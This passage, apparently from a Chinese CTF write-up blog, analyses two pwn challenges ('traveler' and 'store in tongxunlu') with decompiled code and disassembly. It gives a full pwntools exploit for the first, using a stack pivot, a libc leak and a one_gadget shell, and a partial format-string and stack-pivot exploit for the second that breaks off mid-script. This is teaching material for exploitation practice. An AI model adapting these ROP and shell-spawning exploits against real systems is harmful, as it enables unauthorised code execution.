u?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many travels can a person have in his life?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;msg, <span class="hljs-number">0x28</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>第一步覆盖rbp，ret，进行栈迁移</p>
<p>第二步，向bss段写，控栈，五条指令</p>
<p><strong>汇编</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040120A 48 8D 3D 01 0E 00 00          lea     rdi, s                          ; &quot;who r u?&quot;<br>.text:0000000000401211 E8 5A FE FF FF                call    _puts<br>.text:0000000000401211<br>.text:0000000000401216 48 8D 45 E0                   lea     rax, [rbp+buf]<br>.text:000000000040121A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; nbytes<br>.text:000000000040121F 48 89 C6                      mov     rsi, rax                        ; buf<br>.text:0000000000401222 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000401227 E8 74 FE FF FF                call    _read<br>.text:0000000000401227<br>.text:000000000040122C 48 8D 3D ED 0D 00 00          lea     rdi, aHowManyTravels            ; &quot;How many travels can a person have in h&quot;...<br>.text:0000000000401233 E8 38 FE FF FF                call    _puts<br>.text:0000000000401233<br>.text:0000000000401238 BA 28 00 00 00                mov     edx, 28h ; &#x27;(&#x27;                  ; nbytes<br>.text:000000000040123D 48 8D 35 5C 2E 00 00          lea     rsi, msg                        ; buf<br>.text:0000000000401244 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000401249 E8 52 FE FF FF                call    _read<br>.text:0000000000401249<br>.text:000000000040124E B8 00 00 00 00                mov     eax, 0<br>.text:0000000000401253 C9                            leave<br>.text:0000000000401254 C3                            retn<br></code></pre></td></tr></table></figure>

<p><strong>注意末尾的<code>mov eax,0</code>指令，这一步之后，就不能复用了，所以不能利用这一段的Gadget</strong></p>
<h4 id="pop-x2F-push-x2F-ret"><a href="#pop-x2F-push-x2F-ret" class="headerlink" title="pop&#x2F;push&#x2F;ret"></a>pop&#x2F;push&#x2F;ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop<br>	rsp+8<br><br>push<br>	rsp-8<br><br>call s<br>	push rip<br>	jmp s<br><br>leave<br>	mov rsp,rbp <br>	pop rbp<br>	<br>ret<br>	pop rip<br>	jmp xx<br></code></pre></td></tr></table></figure>





<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p><strong>ret2syscall</strong></p>
<p><strong>1. 通过栈迁移，控制gadget，实现再次写</strong></p>
<p><strong>2. 布栈，实现泄露libc，同时控制程序流，返回main</strong></p>
<p><strong>3. 再次栈迁移，控制gadget，实现再次写</strong></p>
<p><strong>4. 布栈，控制寄存器，打one_gadget</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">one_gadget -f libc-2.31.so</span><br><br>0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)<br>constraints:<br>  [r15] == NULL || r15 == NULL<br>  [r12] == NULL || r12 == NULL<br><br>0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)<br>constraints:<br>  [r15] == NULL || r15 == NULL<br>  [rdx] == NULL || rdx == NULL<br><br>0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)<br>constraints:<br>  [rsi] == NULL || rsi == NULL<br>  [rdx] == NULL || rdx == NULL<br><br></code></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;Linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>banary = <span class="hljs-string">&quot;./traveler&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port = <span class="hljs-number">28855</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>	<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#----------------- 0. Gadget ----------------------</span><br>pop_rdi_ret = <span class="hljs-number">0x00000000004012c3</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x00000000004012c1</span><br>leave_ret = <span class="hljs-number">0x0000000000401253</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;puts_got&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;puts_plt&#x27;</span>)<br><br>bss = <span class="hljs-number">0x00000000004040A0</span> + <span class="hljs-number">0x400</span><br>read = <span class="hljs-number">0x0000000000401216</span><br>main = <span class="hljs-number">0x4011F4</span><br><br><span class="hljs-comment">#----------------- 1. stack_piviot ----------------------</span><br><span class="hljs-comment">#bss-0x20</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss) + p64(read)<br>sa(<span class="hljs-string">&#x27;who r u?&#x27;</span>, payload1)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#----------------- 2. leak_libc  -------------------------</span><br><span class="hljs-comment">#read(0, 0x404480 ,0x30)</span><br>payload2 =  p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) <br>payload2 += p64(bss-<span class="hljs-number">0x28</span>) +p64(leave_ret)<br>s(payload2)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg(<span class="hljs-string">&#x27;puts_addr&#x27;</span>)<br><br><span class="hljs-comment">#libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pop_r12 = libc_base + <span class="hljs-number">0x000000000002f709</span><br>one_gadget = libc_base + <span class="hljs-number">0xe3afe</span><br><br><span class="hljs-comment">#----------------- 3. pwn    -------------------------</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss+<span class="hljs-number">0x80</span>) + p64(read)<br>s(payload1)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br> <br>payload3 =  p64(pop_r12) + p64(<span class="hljs-number">0</span>) + p64(one_gadget) + p64(<span class="hljs-number">0</span>) <br>payload3 += p64(bss+<span class="hljs-number">0x80</span>-<span class="hljs-number">0x28</span>) + p64(leave_ret)<br>sl(payload3)<br><br>pi()<br></code></pre></td></tr></table></figure>





<h2 id="2-store-in-tongxunlu"><a href="#2-store-in-tongxunlu" class="headerlink" title="2.store in tongxunlu"></a>2.store in tongxunlu</h2><p>提示：ubuntu20</p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><strong>保护</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/chen/桌面/match/VN/TONGXUN/store&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br></code></pre></td></tr></table></figure>



<p><strong>eeee_wantboy</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">eeee_wantboy</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+100h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+12Ch] [rbp-4h]</span><br><br>  v4 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;halo little giegie,my name is eeee,i am 11111&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;can i get your phone number&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i get you ! little giegie&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heyhey , hao_kang_de is %lx \n&quot;</span>, v1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;anything want to say?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>第一次输入，0x10字节的溢出，通过栈覆写ret，使得程序流复原</p>
<p>之后接受栈地址</p>
<p>第二次输入，布栈，</p>
<p><strong>hao_kang_de</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">hao_kang_de</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v0; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wait!! i will give you something&quot;</span>);<br>  v0 = sys_write(<span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hhhh~i just tell a joke&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>syscall，瞅汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000000087B 55                            push    rbp<br>.text:000000000000087C 48 89 E5                      mov     rbp, rsp<br>.text:000000000000087F 48 8D 3D B2 01 00 00          lea     rdi, s                          ; &quot;wait!! i will give you something&quot;<br>.text:0000000000000886 E8 25 FE FF FF                call    _puts<br>.text:0000000000000886<br>.text:000000000000088B 48 C7 C0 01 00 00 00          mov     rax, 1<br>.text:0000000000000892 48 C7 C7 00 00 00 00          mov     rdi, 0                          ; fd<br>.text:0000000000000899 48 C7 C6 00 00 00 00          mov     rsi, 0                          ; buf<br>.text:00000000000008A0 48 C7 C2 00 00 00 00          mov     rdx, 0                          ; count<br>.text:00000000000008A7 0F 05                         syscall                                 ; LINUX - sys_write<br><br>.text:00000000000008A9 48 8D 3D A9 01 00 00          lea     rdi, aHhhhIJustTellA            ; &quot;hhhh~i just tell a joke&quot;<br>.text:00000000000008B0 E8 FB FD FF FF                call    _puts<br>.text:00000000000008B0<br>.text:00000000000008B5 90                            nop<br>.text:00000000000008B6 5D                            pop     rbp<br>.text:00000000000008B7 C3                            retn<br></code></pre></td></tr></table></figure>





<p><strong>汇编</strong></p>
<p>重点放在最后几个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000000090B 48 8D 3D F2 01 00 00          lea     rdi, format                     ; &quot;i get you ! little giegie&quot;<br>.text:0000000000000912 B8 00 00 00 00                mov     eax, 0<br>.text:0000000000000917 E8 A4 FD FF FF                call    _printf<br>.text:0000000000000917<br><br>.text:000000000000091C 48 8D 85 D0 FE FF FF          lea     rax, [rbp+var_130]<br>.text:0000000000000923 48 89 C6                      mov     rsi, rax<br>.text:0000000000000926 48 8D 3D F1 01 00 00          lea     rdi, aHeyheyHaoKangD            ; &quot;heyhey , hao_kang_de is %lx \n&quot;<br>.text:000000000000092D B8 00 00 00 00                mov     eax, 0<br>.text:0000000000000932 E8 89 FD FF FF                call    _printf<br>.text:0000000000000932<br><br>.text:0000000000000937 48 8D 3D FE 01 00 00          lea     rdi, aAnythingWantTo            ; &quot;anything want to say?&quot;<br>.text:000000000000093E E8 6D FD FF FF                call    _puts<br>.text:000000000000093E<br><br>.text:0000000000000943 48 8D 85 D0 FE FF FF          lea     rax, [rbp+var_130]<br>.text:000000000000094A BA 00 01 00 00                mov     edx, 100h                       ; nbytes<br>.text:000000000000094F 48 89 C6                      mov     rsi, rax                        ; buf<br>.text:0000000000000952 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000000957 E8 74 FD FF FF                call    _read<br>.text:0000000000000957<br><br>.text:000000000000095C 48 8D 45 D0                   lea     rax, [rbp+buf]<br>.text:0000000000000960 BA 0A 00 00 00                mov     edx, 0Ah                        ; base<br>.text:0000000000000965 BE 00 00 00 00                mov     esi, 0                          ; endptr<br>.text:000000000000096A 48 89 C7                      mov     rdi, rax                        ; nptr<br>.text:000000000000096D E8 6E FD FF FF                call    _strtol<br>.text:000000000000096D<br><br>.text:0000000000000972 89 45 F4                      mov     [rbp+var_C], eax<br>.text:0000000000000975 90                            nop<br>.text:0000000000000976 C9                            leave<br>.text:0000000000000977 C3                            retn<br></code></pre></td></tr></table></figure>













<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p><strong>一：非预期，但是很牛逼</strong></p>
<ol>
<li>第一次输入结束后，会给一个栈地址，要去接收。</li>
<li>在其前，有一次0x10字节的栈溢出，通过覆写ret末字节，进行一个短距离的迁移，使得再次执行main，此时也有栈地址了</li>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call h:<br>	push rip (rsp -= 0x8)<br>	<br>h:<br>	push rbp<br>	mov rbp, rsp<br><br>leave:<br>	mov rsp, rbp<br>	pop rbp<br>ret:<br>	pop rip<br></code></pre></td></tr></table></figure>



<p><strong>二：出题者思路</strong></p>
<p>利用sys_write进行泄露</p>
<h3 id="非预期exp"><a href="#非预期exp" class="headerlink" title="非预期exp"></a>非预期exp</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/maple105890/article/details/129115700">https://blog.csdn.net/maple105890/article/details/129115700</a></p>
<p>太牛逼了，丝滑的一，人造格式化字符串漏洞</p>
<p>从而泄露libc，elf</p>
<p>再在栈上布置ROP，做栈迁移执行就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br> <br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./store&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><br><span class="hljs-comment">#-----------------------------1. ret_main + recv_stack   ---------------------------</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p8(<span class="hljs-number">0x79</span>)<br>p.sendafter(<span class="hljs-string">b&quot;if you give me your number,i will give you some hao_kang_de\n&quot;</span>,payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;is &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&quot;stack_addr&quot;</span>)<br><span class="hljs-comment">#rsp = stack_add</span><br><span class="hljs-comment">#rbp = stack_addr + 0x130</span><br><br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,<span class="hljs-string">b&#x27;Korey0sh1&#x27;</span>)<br><br>debug()<br><span class="hljs-comment">#-----------------------------2. fmt + leak_libc       ------------------------------ </span><br><span class="hljs-comment">#rsp = stack_add</span><br><span class="hljs-comment">#rbp = stack_addr + 0x120</span><br><span class="hljs-comment">#read(0, stack_addr+0x100, 0x40)</span><br><br>payload = <span class="hljs-string">b&#x27;%7$p|%11$p&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(stack_addr + <span class="hljs-number">0x240</span>) + p8(<span 